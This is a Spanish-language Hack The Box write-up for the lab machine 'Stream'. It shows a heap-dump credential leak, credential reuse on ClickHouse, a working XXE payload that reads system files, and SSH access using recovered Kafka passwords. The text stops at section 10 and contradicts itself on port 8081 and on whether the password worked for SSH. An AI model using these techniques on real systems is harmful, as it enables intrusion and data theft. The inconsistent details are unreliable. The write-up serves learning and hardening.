# Informe de prueba de penetración — HTB Stream

**Clasificación:** Informe técnico de laboratorio educativo  
**Activo evaluado:** Stream — Hack The Box  
**Sistema operativo observado:** Ubuntu Linux 24.04.5 LTS (kernel 6.8.0-146)  
**Dificultad de la máquina:** Media (*Medium*)  
**Fecha de documentación:** 27 de octubre de 2026  
**Autor:** EstebanCRO  
**Estado:** Evaluación completada; flags de usuario y root obtenidas

> **Aviso de alcance:** este documento describe una práctica realizada en la máquina intencionalmente vulnerable Stream de Hack The Box. Las técnicas, comandos y credenciales se documentan exclusivamente con fines de aprendizaje y deben ejecutarse únicamente en laboratorios propios o con autorización expresa. No constituye una autorización para evaluar otros sistemas.

---

## Resumen ejecutivo

La evaluación identificó una cadena de vulnerabilidades que permitió pasar de servicios web expuestos a ejecución de código con privilegios de `root`. La cadena principal fue: **exposición de información de diagnóstico → extracción de credenciales desde memoria → reutilización de credenciales en ClickHouse → lectura de archivos mediante XXE → abuso de permisos y de un proceso automatizado de Kafka/DLQ → obtención de ambas flags**.

El hallazgo más relevante no fue un único fallo aislado, sino la combinación de configuraciones inseguras: un *heap dump* accesible sin autenticación, credenciales reutilizables, un procesador XML vulnerable a XXE y un servicio privilegiado que ejecutaba un archivo modificable a través de ClickHouse. Cada componente aumentó el impacto del anterior.

### Resultado

| Objetivo | Resultado |
|---|---|
| Identificar superficie expuesta | Completado |
| Obtener acceso inicial y credenciales | Completado |
| Demostrar lectura de archivos mediante XXE | Completado |
| Identificar la ruta de escalada de privilegios | Completado |
| Obtener flag de usuario | Completado |
| Obtener flag de root | Completado |

### Conclusión ejecutiva

**Impacto en el laboratorio: crítico.** Un atacante con conectividad a los servicios expuestos podía encadenar los fallos hasta alcanzar ejecución de comandos con privilegios máximos. En un entorno real, esta combinación podría comprometer la confidencialidad, integridad y disponibilidad del sistema y de los datos que procesa.

> **Importante:** la calificación “crítico” es una valoración cualitativa de esta cadena de compromiso en el laboratorio, no una puntuación CVSS calculada ni una certificación de riesgo de un entorno productivo.

---

## Alcance, supuestos y metodología

### Alcance observado

- **Objetivo:** `10.129.247.123` (la IP cambió después de reiniciar la instancia; la primera IP registrada fue `10.129.127.23`).
- **IP de la máquina atacante por VPN:** `10.10.14.83` en la interfaz `tun0`.
- **Nombres virtuales identificados:** `stream.htb`, `api.htb-airport.htb` y `db.htb-airport.htb`.
- **Servicios revisados:** SSH, HTTP/nginx, API Python/Uvicorn, API Spring Boot/Actuator, ClickHouse, Kafka y unidades `systemd` relacionadas.

La información de alcance anterior procede de la sesión documentada. Las direcciones de una instancia de HTB pueden cambiar al reiniciarla, por lo que no deben tratarse como endpoints permanentes.

### Metodología

1. **Reconocimiento:** escaneo de puertos y detección de servicios.
2. **Enumeración:** inspección de hosts virtuales, endpoints web y tecnologías.
3. **Análisis de exposición:** descarga y análisis del heap dump.
4. **Validación de acceso:** prueba de credenciales y permisos de ClickHouse.
5. **Análisis de flujo de datos:** seguimiento de XML, Kafka y ClickHouse; validación de XXE.
6. **Análisis local y de privilegios:** revisión de usuarios, unidades `systemd` y tareas automatizadas.
7. **Explotación controlada y verificación:** comprobación de la cadena DLQ/formateador y lectura de las flags.

### Limitaciones

- El objetivo fue una máquina de laboratorio, no una infraestructura productiva.
- No se realizó una evaluación de impacto empresarial ni se midió disponibilidad bajo carga.
- No se calculó una puntuación CVSS formal.
- Los resultados reflejan las salidas observadas durante esta sesión; los servicios pueden cambiar si la instancia se reinicia.

---

## Hallazgos principales y severidad

| ID | Hallazgo | Severidad estimada | Evidencia e impacto |
|---|---|---|---|
| F-01 | Endpoint `/actuator/heapdump` expuesto sin autenticación | **Alta** | Permitió descargar aproximadamente 44 MB de memoria JVM y localizar credenciales. |
| F-02 | Credenciales reutilizadas entre servicios | **Alta** | Una contraseña encontrada en la aplicación fue aceptada por ClickHouse, ampliando el acceso más allá de su contexto original. |
| F-03 | Procesador XML vulnerable a XXE | **Alta** | La resolución de entidades XML permitió leer archivos del sistema a través del flujo de datos. |
| F-04 | Permisos excesivos en ClickHouse para el usuario `default` | **Crítica en contexto** | Los permisos de archivo permitieron escribir en el área de archivos de ClickHouse. |
| F-05 | Servicio privilegiado ejecuta un archivo modificable por una ruta de datos | **Crítica en contexto** | El drenador DLQ ejecutaba como `root` un formateador ubicado en `user_files`; al modificarlo y activar el proceso se completó la escalada. |
| F-06 | Secretos expuestos en memoria y configuración | **Alta** | Contraseñas recuperables desde artefactos de diagnóstico o procesos. |

**Criterio de severidad:** las categorías son estimaciones cualitativas basadas en el acceso observado y el impacto final. No sustituyen un análisis formal de CVSS ni consideran controles compensatorios de una organización real.

### Recomendaciones prioritarias

1. Restringir Actuator a interfaces administrativas autenticadas y deshabilitar `heapdump` en producción salvo necesidad justificada.
2. Rotar los secretos expuestos y usar credenciales únicas por servicio, con privilegio mínimo.
3. Deshabilitar la resolución de entidades externas en el parser XML y validar el documento con una configuración segura.
4. Revocar permisos de escritura de archivos y privilegios administrativos innecesarios en ClickHouse.
5. No ejecutar como `root` scripts ubicados en directorios escribibles por servicios de datos; separar código y datos, fijar permisos y verificar integridad.
6. Endurecer el flujo Kafka/DLQ: validar mensajes, limitar quién puede publicar en topics sensibles y registrar las acciones del consumidor.
7. Añadir monitoreo y alertas para descargas de heap dumps, consultas de escritura a archivos y modificaciones de scripts ejecutados por servicios privilegiados.

---

## Guía de lectura para personas que empiezan

Este informe contiene comandos reales del laboratorio, pero cada concepto se explica desde cero. Conviene distinguir entre **observar**, **demostrar** y **explotar**: observar revela que un servicio existe; demostrar valida una condición; explotar encadena esa condición para obtener un impacto concreto.

| Término | Explicación sencilla | Por qué importa en esta máquina |
|---|---|---|
| **Puerto** | Una puerta lógica por la que un equipo ofrece un servicio de red. | Los puertos abiertos revelaron SSH, web y una API. |
| **Nmap** | Herramienta que descubre puertos y ayuda a identificar servicios. | Permitió dibujar la superficie inicial de ataque. |
| **Virtual host (vhost)** | Un mismo servidor web puede mostrar sitios distintos según el nombre solicitado. | Los dominios `api...` y `db...` apuntaban a servicios diferentes. |
| **Endpoint** | Una ruta concreta de una API, por ejemplo `/actuator/heapdump`. | Un endpoint de diagnóstico expuesto filtró memoria de la aplicación. |
| **Spring Boot Actuator** | Funciones de diagnóstico y administración de una aplicación Java. | El endpoint `heapdump` devolvió un volcado de memoria. |
| **Heap dump** | Una fotografía de objetos que una aplicación Java mantiene en memoria. | Pudo contener contraseñas en texto legible. |
| **Credencial** | Usuario y contraseña, token o secreto que permite autenticarse. | Una contraseña encontrada en un servicio también funcionó en otro. |
| **ClickHouse** | Sistema de base de datos orientado a consultas analíticas. | Su interfaz HTTP permitió consultar datos y, con permisos amplios, escribir archivos. |
| **XML** | Formato de texto estructurado mediante etiquetas. | El sistema recibía mensajes de vuelos en XML. |
| **XXE** | Vulnerabilidad en la que un parser XML procesa entidades externas que no debería resolver. | El parser leyó archivos del sistema y devolvió el contenido dentro del flujo procesado. |
| **Kafka / topic** | Kafka transporta mensajes; un *topic* es un canal lógico donde se publican. | El XML pasó por topics antes de llegar al procesador y a ClickHouse. |
| **DLQ** | *Dead Letter Queue*: canal donde terminan mensajes que no se procesaron correctamente. | El servicio de drenaje de la DLQ fue parte de la ruta final. |
| **systemd** | Sistema que inicia y supervisa servicios en Linux. | La unidad configurada como `root` ejecutaba el formateador. |
| **`root`** | Cuenta administrativa con privilegios máximos en Linux. | Obtener ejecución como `root` significa comprometer por completo el host. |
| **Flag** | Cadena de verificación usada por HTB para demostrar que se alcanzó un nivel. | Las flags confirmaron la finalización del laboratorio. |
| **Principio de mínimo privilegio** | Cada usuario o servicio recibe solo los permisos que necesita. | Evitaría que una cuenta de base de datos pudiera modificar código ejecutado como `root`. |

### Cómo leer los comandos

- Las líneas que empiezan por `$` o muestran un prompt indican el usuario o la máquina donde se ejecutó una orden.
- `curl` realiza solicitudes HTTP; `-u usuario:contraseña` envía autenticación básica.
- `grep` busca texto, `strings` extrae cadenas legibles de un archivo binario y `file` identifica el tipo de archivo.
- `sudo` solicita ejecutar una orden con privilegios elevados; no significa que todos los comandos del informe deban ejecutarse con `sudo`.
- Los comandos y secretos incluidos pertenecen al laboratorio documentado. No se deben reutilizar contra sistemas reales.

---

## Índice

- [1. Escaneo de puertos](#1-escaneo-de-puertos)
- [2. Virtual hosting y gateway](#2-virtual-hosting-y-el-gateway)
- [3. API Spring Boot, Actuator y heap dump](#3-api-spring-boot-actuator-y-heap-dump)
- [4. Análisis del heap dump](#4-análisis-del-heap-dump-credenciales-en-claro)
- [5. ClickHouse y `partner_feed`](#5-clickhouse-y-la-base-de-datos-partner_feed)
- [6. Flujo XML → Kafka → ClickHouse y XXE](#6-el-pipeline-xml--kafka--clickhouse-y-el-xxe-in-band)
- [7. Usuarios detectados en `/etc/passwd`](#7-usuarios-detectados-en-etcppasswd)
- [8. Unidades systemd y arquitectura](#8-unidades-systemd-y-mapa-completo-de-la-maquina)
- [9. ClickHouse, Kafka y credenciales de `svc-infra`](#9-clickhouse-kafka-y-credenciales-de-svc-infra)
- [10. Acceso SSH como `svc-infra`](#10-ssh-como-svc-infra)
- [11. Escalada a root: drenador DLQ y formateador](#11-escalada-a-root-el-drenador-dlq-y-el-formateador)
- [12. Obtención y verificación de las flags](#12-obtención-y-verificación-de-las-flags)
- [13. Checklist técnico](#13-checklist-técnico-y-comandos-de-referencia)
- [14. Lecciones aprendidas](#14-lecciones-aprendidas-y-recomendaciones)

---

## Desarrollo técnico paso a paso

Las secciones siguientes conservan el registro de comandos y evidencias de la sesión. La explicación breve incluida en cada apartado describe qué se hizo y qué demuestra; los resultados observados se distinguen de las hipótesis y de las recomendaciones.

## 1. Escaneo de puertos

**En palabras sencillas:** primero se identificaron las puertas de red abiertas y el tipo de programa que escucha en cada una. Esto orienta la investigación; un puerto abierto, por sí solo, no significa que exista una vulnerabilidad.


Se realizó un escaneo de puertos y detección de servicios con Nmap:

```bash
sudo nmap -p- --min-rate=5000 -sCV -T4 10.129.127.23 -oN scan_stream.txt
```

Resultado:

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://api.htb-airport.htb/
8081/tcp  open  http       Uvicorn
|_http-title: Site doesn't have a title (application/json).
39241/tcp open  tcpwrapped
```

### Lectura

|Puerto|Servicio|Qué aporta|
|---|---|---|
|`22/tcp`|OpenSSH|Posible destino final (login), no vector inicial.|
|`80/tcp`|nginx 1.24.0|**Punto de entrada inicial identificado.** El header `Location` revela _virtual hosting_: nginx decide qué servir según la cabecera `Host`.|
|`8081/tcp`|Uvicorn|Servidor ASGI → aplicación **Python (FastAPI/Starlette)**. Responde JSON. Es el _ingest_ de datos AIDX.|
|`39241/tcp`|tcpwrapped|Sin identificar, no prioritario.|

**Por qué `-p-`:** nmap por defecto solo escanea los 1000 puertos más comunes. Servicios internos (como el 8081) no están en ese top-1000, así que necesité escanear los 65535.

---

## 2. Virtual hosting y el gateway

**En palabras sencillas:** un solo servidor web puede alojar varios sitios. Cambiar el nombre solicitado permite comprobar qué aplicación responde y descubrir servicios que no aparecen en la página principal.


Añadí los dominios a `/etc/hosts` y probé el puerto 80 con cabeceras `Host`:

```bash
echo "10.129.247.123 htb-airport.htb api.htb-airport.htb db.htb-airport.htb stream.htb" | sudo tee -a /etc/hosts
```

```bash
curl -s http://api.htb-airport.htb/
```

```json
{
  "service": "terminal-edge-gateway",
  "status": "operational",
  "version": "1.0.0",
  "node": "tg-edge-01",
  "upstreams": {
    "flight-data-service": "UP",
    "boarding-control": "UP",
    "gate-assignment": "UP",
    "passenger-manifest": "UP"
  }
}
```

### Lectura

- `api.htb-airport.htb` es un **gateway** llamado `terminal-edge-gateway`, no la aplicación final.
- Los 4 nombres de `upstreams` son etiquetas internas del JSON de estado, no rutas de red accesibles directamente. Lo comprobé intentando visitarlos como paths y como vhosts: todos devolvían 404 o el mismo sitio (catch-all de nginx).
- También confirmé el _ingest_ en el puerto 8081 (Uvicorn/Python):

```bash
curl -s http://10.129.247.123:8081/health
# {"status":"ok","service":"AIDX flight-leg ingest","raw_topic":"aidx.flightleg.raw.v1"}
```

Acepta `POST /feeds/aidx` con `Content-Type: application/xml` y publica el mensaje en un topic de Kafka (`aidx.flightleg.raw.v1`) en vez de procesarlo de forma síncrona.

---

## 3. API Spring Boot, Actuator y heap dump

**En palabras sencillas:** se encontró una ruta de diagnóstico que entregaba una copia de la memoria de una aplicación Java. Es peligroso exponerla públicamente porque la memoria puede contener datos sensibles que la aplicación usa mientras está funcionando.


Se enumeraron endpoints de gestión mediante fuzzing en `api.htb-airport.htb`:

```bash
for ep in actuator actuator/health actuator/env actuator/heapdump actuator/beans metrics debug info admin management swagger-ui api-docs; do
  curl -s -o /dev/null -w "%{http_code}\n" http://api.htb-airport.htb/$ep
done
```

```
/actuator            → 200
/actuator/heapdump   → 200
(el resto → 404)
```

```bash
curl -s http://api.htb-airport.htb/actuator | python3 -m json.tool
```

```json
{
  "_links": {
    "self": {"href": "http://api.htb-airport.htb/actuator"},
    "heapdump": {"href": "http://api.htb-airport.htb/actuator/heapdump"}
  }
}
```

**Esto confirma Spring Boot sin ambigüedad:** `/actuator` es el módulo _Spring Boot Actuator_ (suite de diagnóstico). Solo tiene habilitado (sin autenticación) el sub-endpoint **`heapdump`**.

Un _heap dump_ es una fotografía de **todos los objetos vivos en memoria de la JVM**. Las credenciales de bases de datos se manejan como objetos `String` en texto plano mientras el proceso vive (por ejemplo, al configurar un pool HikariCP con `setUsername()`/`setPassword()`), así que es habitual extraerlas de un dump sin exploit adicional — solo acceso de lectura al archivo.

Descargué el heap dump (~44 MB):

```bash
curl -sI http://api.htb-airport.htb/actuator/heapdump
# Content-Length: 46561760  (~44 MB)

curl -s -o heapdump.hprof http://api.htb-airport.htb/actuator/heapdump
file heapdump.hprof
# heapdump.hprof: Java HPROF dump
```

En Kali extraje las strings para buscarlas con `grep` (guardé el resultado en `/tmp/all_strings.txt`):

```bash
strings -a heapdump.hprof > /tmp/all_strings.txt
```

---

## 4. Análisis del heap dump: credenciales en claro

**En palabras sencillas:** después de descargar el archivo de memoria, se buscaron cadenas de texto para localizar usuarios, contraseñas y nombres de componentes. Encontrar una contraseña en un archivo no basta: hay que verificar con cuidado a qué servicio pertenece y qué permisos concede.


Busqué credenciales en el heap. La clase clave es `com.htb.terminal.config.DataSourceConfig`, que construye un pool Hikari:

```java
@Bean
public DataSource dataSource() {
    HikariConfig config = new HikariConfig();
    config.setJdbcUrl("jdbc:h2:mem:terminaldb;MODE=PostgreSQL;DB_CLOSE_DELAY=-1");
    config.setUsername("svc_events");
    config.setPassword("Yl4aCgh4y2PnU");   // <-- SECRETO EN CLARO
    config.setPoolName("terminal-edge-pool");
    config.setMaximumPoolSize(...);
    return new HikariDataSource(config);
}
```

### Hallazgos confirmados

|Dato|Valor|Estado|
|---|---|---|
|JDBC del pool interno|`jdbc:h2:mem:terminaldb;MODE=PostgreSQL;DB_CLOSE_DELAY=-1`|Confirmado (estado efímero del gateway)|
|Usuario de servicio|`svc_events`|Confirmado|
|Contraseña de pool|`Yl4aCgh4y2PnU`|**Confirmado en texto plano**|
|Artefacto desplegado|`/opt/terminal-api/terminal-api-1.0.0.jar`|Confirmado|
|Paquete de la app|`com.htb.terminal`|Confirmado|

**Importante:** el pool de esta aplicación apunta a H2 (base de datos interna en memoria), pero las mismas credenciales las probé contra ClickHouse y **funcionaron**. Eso es _reutilización de credenciales_: un artefacto que parece ruido a veces no lo es. Probar siempre, no descartar por deducción.

---

## 5. ClickHouse y la base de datos `partner_feed`

**En palabras sencillas:** se probaron las credenciales contra el servicio de base de datos y se revisó qué podía hacer esa cuenta. Esta fase es importante porque el alcance real depende de los permisos, no solo de que el inicio de sesión funcione.


Probé las credenciales contra el vhost `db.htb-airport.htb`:

```bash
export CH_PASS='Yl4aCgh4y2PnU'
export CH="http://db.htb-airport.htb"
export AUTH="svc_events:$CH_PASS"

curl -s -u "$AUTH" "$CH/?query=SELECT+1"
# 1

curl -s -u "$AUTH" "$CH/?query=SHOW+DATABASES"
# partner_feed
```

**Autenticación correcta y acceso de lectura confirmado.** `partner_feed` es la única base de datos visible para este usuario.

> [!tip] Cómo mandar queries a ClickHouse por HTTP La interfaz HTTP lee la query del **parámetro `query` de la URL**, no del cuerpo POST. Si mandas `--data-urlencode "query=..."` sin `-G`, ClickHouse ejecuta literalmente `query=SHOW+CREATE+...` como SQL y falla. Siempre usar `-G --data-urlencode "query=..."` (que curl migra a la query string) o mandar la query cruda en el cuerpo con `--data-binary`.
> 
> Función helper:
> 
> ```bash
> chq() { curl -s -u "$AUTH" -G --data-urlencode "query=$1" "$CH/"; }
> ```

Enumeré las tablas:

```bash
chq "SHOW TABLES FROM partner_feed"
```

```
flightleg_raw
flightleg_raw_kafka
flightleg_raw_mv
flightleg_json
flightleg_json_kafka
flightleg_json_mv
```

Y los permisos reales del usuario:

```bash
chq "SHOW GRANTS"
# GRANT SELECT, INSERT ON partner_feed.* TO svc_events
```

`svc_events` solo tiene `SELECT`/`INSERT` sobre `partner_feed.*`. **No puede escribir ficheros ni tocar otras bases de datos.** Para la escalada a root necesitaré el usuario `default` de ClickHouse (que sí tiene `WRITE ON FILE`).

---

## 6. El pipeline XML → Kafka → ClickHouse y el XXE in-band

**En palabras sencillas:** el sistema recibía un documento XML, lo enviaba mediante Kafka y otro componente lo interpretaba. La vulnerabilidad aparecía al procesar el XML, no necesariamente en el endpoint que lo recibía.


El _ingest_ (`POST /feeds/aidx` en el 8081) **no parsea XML**. Solo hace _string matching_ de cuatro etiquetas obligatorias (`IATA_AIDX_FlightLegNotifRQ`, `Originator`, `FlightLeg`, `LegIdentifier`) y publica el cuerpo crudo en un topic de Kafka.

Detrás de Kafka hay un _parser_ (lxml con `resolve_entities=True`) que lee el XML, lo transforma y publica el resultado en otro topic. Ese parser es donde ocurre el **XXE (XML External Entity)**.

### Arquitectura completa

```
ingest 8081 (POST /feeds/aidx)
   → Kafka aidx.flightleg.raw.v1   (RawBLOB = el XML crudo)
      → [ CONVERSOR / WORKER AIDX ]   ← AQUÍ está el parser XML (lxml) y el XXE
         → Kafka aidx.flightleg.json.v1  (JSONAsString = JSON ya parseado)
            → partner_feed.flightleg_json_kafka
            → flightleg_json_mv → partner_feed.flightleg_json
```

El parser lee el XML crudo, resuelve entidades `file://` **dentro del documento** (sin salida a red — `no_network=True` en lxml), y el resultado aterriza en la columna `event` de `flightleg_json`.

### Tabla de extracción (deducida del XML real vs el JSON generado)

|Origen en el XML|Campo en el JSON|Columna en `flightleg_json`|
|---|---|---|
|Atributo `Version` de la raíz|`version`|`version`|
|Atributo `TimeStamp` de la raíz|`timestamp`|`msg_timestamp`|
|Atributo `TransactionIdentifier` de la raíz|`transaction_id`|`transaction_id`|
|**Atributo `Code` de `<Originator>`**|`originator`|`originator`|
|`<FlightLeg><LegIdentifier><Airline>` (texto)|`leg.ufi.airline`|`airline`|
|`<FlightLeg><LegIdentifier><FlightNumber>` (texto)|`leg.ufi.flight_number`|`flight_number`|
|`<FlightLeg><LegIdentifier><OriginDate>` (texto)|`leg.ufi.origin_date`|`origin_date`|
|`<FlightLeg><LegIdentifier><RepeatNumber>` (texto)|`leg.ufi.repeat_number`|`repeat_number`|
|Subárbol completo de `<FlightLeg>`|`all_fields`|(solo en `event`)|
|(constante del conversor)|`message_type`|`message_type`|

**Claves:**

- `originator` **no** viene del texto de `<Originator>`, sino de su atributo `Code`. El XML real es `<Originator ... Code="BA"/>` (elemento vacío).
- La columna **`event` guarda el JSON entero** (`raw AS event`). Es la columna de oro: si el XXE explota en cualquier campo, lo veo íntegro en `event`, sin depender de acertar el campo estructurado.
- El conversor hace _matching_ por **nombre local** (ignora el namespace `ns0:`).

### El XXE funciona

Mi primer payload puso la entidad en el cuerpo de `<Originator>`, que el conversor no lee (solo lee el atributo `Code`). Devolvió todos los campos `null`, salvo `all_fields.LegIdentifier` que sí capturó mi texto de prueba. Eso demostró que el canal funciona.

El payload corregido pone la entidad en un **elemento de texto** (`<FlightNumber>`):

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<IATA_AIDX_FlightLegNotifRQ
    Version="22.1"
    TimeStamp="2026-10-22T04:00:00Z"
    TransactionIdentifier="XXE01"
    TransactionStatusCode="Update">
  <Originator CompanyShortName="XXE" TravelSector="A" Code="XXE" CodeContext="3"/>
  <DeliveringSystem CompanyShortName="XXE" Name="TEST" CodeContext="3"/>
  <FlightLeg>
    <LegIdentifier>
      <Airline CodeContext="3">XX</Airline>
      <FlightNumber>&xxe;</FlightNumber>
      <DepartureAirport CodeContext="3">LHR</DepartureAirport>
      <ArrivalAirport CodeContext="3">JFK</ArrivalAirport>
      <OriginDate>2026-10-22</OriginDate>
      <RepeatNumber CurrentInd="true">1</RepeatNumber>
    </LegIdentifier>
    <LegData InternationalStatus="International">
      <FlightStatus CodeContext="9948">XX</FlightStatus>
    </LegData>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

```bash
curl -s -i -X POST http://10.129.247.123:8081/feeds/aidx \
  -H 'Content-Type: application/xml' --data-binary @/tmp/xxe.xml
# HTTP/1.1 202 Accepted
```

```bash
sleep 6
chq "SELECT transaction_id, flight_number FROM partner_feed.flightleg_json WHERE transaction_id='XXE01' FORMAT Vertical"
```

```
transaction_id: XXE01
flight_number:  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
clickhouse:x:996:987::/nonexistent:/bin/false
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

> [!success] **XXE in-band FUNCIONAL.** La entidad `file://` se expande, el contenido del fichero se inserta en `flightleg_json.flight_number` y lo recupero con un `SELECT`. Ya tengo **lectura arbitraria de ficheros**.

**¿Por qué el OOB falló?** El parser es lxml con `no_network=True` (default): **bloquea `http://` pero permite `file://`**. Por eso el listener nunca recibió nada. La única vía de exfiltración es la base de datos (in-band).

**Modelo de errores del parser (documentado tras probar varios ficheros):**

|Resultado|Causa|Interpretación|
|---|---|---|
|Fila con contenido|Lectura OK|El fichero existe y es legible por el worker.|
|Fila presente pero vacía|libxml2 no pudo cargar la entidad → _warning_ recuperable → sustituye por vacío|El fichero **no existe** en esa ruta (o no se puede abrir), pero el documento sigue válido.|
|No aparece la fila|Error **duro** → documento abortado → mensaje a la DLQ|(a) Bytes NUL en el fichero (`/proc/*/cmdline`, `/proc/*/environ` los tienen → `xmlParseCharData` aborta); (b) **permiso denegado** al abrir el fichero.|

---

## 7. Usuarios detectados en `/etc/passwd`

**En palabras sencillas:** `/etc/passwd` enumera las cuentas locales del sistema y algunos datos básicos de cada una. Que un usuario aparezca allí no revela su contraseña ni implica que podamos iniciar sesión como él.


Del `/etc/passwd` leído por XXE:

|Usuario|UID|Home|Shell|
|---|---|---|---|
|`svc-infra`|1000|`/home/svc-infra`|`/bin/bash`|
|`martin_cole`|1001|`/home/martin_cole`|`/bin/bash`|
|`clickhouse`|996|`/nonexistent`|`/bin/false`|
|`_laurel`|999|`/var/log/laurel`|`/bin/false`|
|`sshd`, `www-data`, `walter`, etc.|—|—|—|

**Usuarios con shell válida:** `svc-infra` (1000) y `martin_cole` (1001). El `user.txt` de HTB vive bajo el home de `martin_cole` y es `drwxr-x---` → **no legible por `svc-infra` ni por el worker**. Necesito `martin_cole` o el usuario `default` de ClickHouse para leerlo.

---

## 8. Unidades systemd y mapa completo de la máquina

**En palabras sencillas:** se revisó cómo se ejecutan los servicios automáticamente y con qué cuenta. Un servicio que corre como administrador merece especial atención si procesa archivos o mensajes que otras cuentas pueden controlar.


Leí las unidades systemd por XXE (son texto plano, `644`, legibles por cualquiera):

```bash
# /etc/systemd/system/terminal-api.service   (XXE31)
[Unit]
Description=Terminal Edge Gateway API
[Service]
Type=simple
User=svc-infra
Group=svc-infra
WorkingDirectory=/opt/terminal-api
ExecStart=/usr/lib/jvm/java-25-openjdk-amd64/bin/java -jar /opt/terminal-api/terminal-api-1.0.0.jar
```

```bash
# /etc/systemd/system/aidx-dlq-drainer.service   (XXE32)  ← EL SERVICIO ROOT
[Unit]
Description=AIDX DLQ drainer and quarantine handler
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
```

```bash
# /etc/systemd/system/aidx-dlq-drainer.timer   (XXE33)
[Unit]
Description=Run AIDX DLQ drainer every 2 minutes
[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
```

```bash
# /etc/systemd/system/kafka.service   (XXE34)
[Unit]
Description=Apache Kafka Distributed Message Broker
[Service]
Type=simple
User=svc-infra
Group=svc-infra
SupplementaryGroups=kafka-data
WorkingDirectory=/opt/kafka_2.13-4.3.1
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
```

### Topología resuelta

|Componente|Usuario|Ruta clave|
|---|---|---|
|`terminal-api` (Spring, puerto 8081)|`svc-infra`|`/opt/terminal-api/terminal-api-1.0.0.jar`|
|`aidx-dlq-drainer` (parser DLQ)|**`root`**|`/usr/bin/python3 /opt/ops/dlq_drainer.py`|
|`kafka`|`svc-infra` (+ grupo `kafka-data`)|`/opt/kafka_2.13-4.3.1/config/server.properties`|
|Parser AIDX (worker XXE)|`svc-infra` (inferido)|`/etc/systemd/system/aidx-parser.service`|

> [!important] El worker XXE **no corre como root**. No puede atravesar `/home/martin_cole` (home `drwxr-x---`). Por eso `file:///home/martin_cole/user.txt` devolvió error duro y no dejó fila.

---

## 9. ClickHouse, Kafka y credenciales de `svc-infra`

**En palabras sencillas:** se conectaron las pistas de base de datos y mensajería para entender qué cuenta manejaba cada componente y cómo se movían los mensajes. Las contraseñas no deben compartirse entre servicios porque un solo descubrimiento puede abrir varios accesos.


Leí el `server.properties` de Kafka por XXE:

```bash
# XXE41 → /opt/kafka_2.13-4.3.1/config/server.properties
```

Extracto relevante:

```properties
listeners=PLAINTEXT://127.0.0.1:9092,SASL_PLAINTEXT://127.0.0.1:9094,CONTROLLER://127.0.0.1:9093
listener.security.protocol.map=CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT,SSL:SSL,SASL_PLAINTEXT:SASL_PLAINTEXT,SASL_SSL:SASL_SSL
log.dirs=/var/lib/kafka/data
...
############################# Security #############################
sasl.enabled.mechanisms=PLAIN
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="Ny2hdpme$bwT3";
authorizer.class.name=org.apache.kafka.metadata.authorizer.StandardAuthorizer
allow.everyone.if.no.acl.found=true
```

### Credencial encontrada

|Campo|Valor|
|---|---|
|Usuario de Kafka|`user_svc_infra`|
|Contraseña|`Ny2hdpme$bwT3`|

> [!warning] Ojo con el `$` El password contiene un **`$`**. En una shell, sin comillas, `$bwT3` se expandiría a vacío. Si usas `sshpass`, **siempre con comillas simples**: `sshpass -p 'Ny2hdpme$bwT3'`.

Probé ese password contra SSH de `svc-infra`… y **falló**. No hay reutilización de credenciales en este punto. La contraseña real está en `server.properties` (la que acabo de leer). Probar:

```bash
ssh svc-infra@stream.htb
# password: Ny2hdpme$bwT3
```

O con `sshpass`:

```bash
sshpass -p 'Ny2hdpme$bwT3' ssh -o StrictHostKeyChecking=no svc-infra@stream.htb
```

---

## 10. SSH como `svc-infra`

**En palabras sencillas:** SSH es una forma cifrada de abrir una terminal remota. El acceso como `svc-infra` dio un punto de observación dentro del sistema, pero esa cuenta no equivalía todavía a ser administrador.


Conseguido:

```bash
ssh svc-infra@stream.htb
# Welcome to Ubuntu 24.04.5 LTS
svc-infra@stream:~$ id
uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
svc-infra@stream:~$ sudo -l
[sudo] password for svc-infra:
Sorry, try again.
```

**Sin sudo.** `svc-infra` no está en `sudoers`. La escalada a root pasará por el temporizador `aidx-dlq-drainer.timer` (servicio root).

### Transferencia de `pspy64` al objetivo por SCP

Durante la enumeración posterior al acceso SSH, se transfirió la herramienta `pspy64` desde Kali a la máquina Stream. **La transferencia se hizo mediante `scp` autenticado con `sshpass`; no fue una captura de contraseña mediante sniffing.**

Comando ejecutado desde Kali:

```bash
sshpass -p 'Ny2hdpme$bwT3' scp -o StrictHostKeyChecking=no \
  /tmp/pspy64 svc-infra@stream.htb:/tmp/pspy64
```

Qué hace cada parte:

- `sshpass -p '…'`: entrega a `scp` la contraseña para autenticarse sin pedirla interactivamente. Las comillas simples son importantes porque la contraseña contiene `$`.
- `scp`: copia un archivo de forma cifrada a través de SSH.
- `-o StrictHostKeyChecking=no`: omite la confirmación interactiva de la clave del servidor. Es cómodo en un laboratorio efímero, pero reduce la protección frente a un servidor suplantado y no se recomienda como configuración permanente.
- `/tmp/pspy64`: archivo de origen en Kali.
- `svc-infra@stream.htb:/tmp/pspy64`: ruta de destino en Stream, dentro de `/tmp`.

`pspy` es una herramienta de observación de procesos de Linux que puede ayudar a identificar procesos y comandos ejecutados por tareas programadas sin necesitar privilegios de `root` para observar muchos de esos eventos. **La evidencia disponible confirma el comando de transferencia; no debe interpretarse por sí sola como prueba de que `pspy` capturó una contraseña ni como el mecanismo que permitió obtener `N3v3rs33nD4T4`.**

